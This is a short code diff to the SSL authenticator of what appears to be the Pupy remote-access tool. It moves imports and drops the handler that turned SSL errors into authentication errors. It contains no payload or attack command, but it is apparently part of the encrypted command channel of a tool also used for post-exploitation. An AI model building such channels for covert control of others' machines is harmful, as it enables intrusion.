@@ -5,13 +5,11 @@
 
 import os
 import tempfile
+import ssl
 
 from network.lib import PupyTCPServer, PupySocketStream
 from network.lib import DummyPupyTransport, PupySSLClient
 from network.transports import Transport
-
-import sys
-import ssl
 
 from rpyc.utils.authenticators import AuthenticationError
 
@@ -44,8 +42,6 @@ class PupySSLAuthenticator(object):
         os.write(fd_ca_path, self.castr)
         os.close(fd_ca_path)
 
-        exception = None
-
         try:
             wrapped_socket = ssl.wrap_socket(
                 sock,
@@ -57,16 +53,11 @@ class PupySSLAuthenticator(object):
                 ssl_version=self.ssl_version,
                 ciphers=self.ciphers
             )
-        except ssl.SSLError:
-            exception = sys.exc_info()[1]
 
         finally:
             os.unlink(tmp_cert_path)
             os.unlink(tmp_key_path)
             os.unlink(tmp_ca_path)
-
-        if exception:
-            raise AuthenticationError(str(exception))
 
         peer = wrapped_socket.getpeercert()
         peer_role = ''
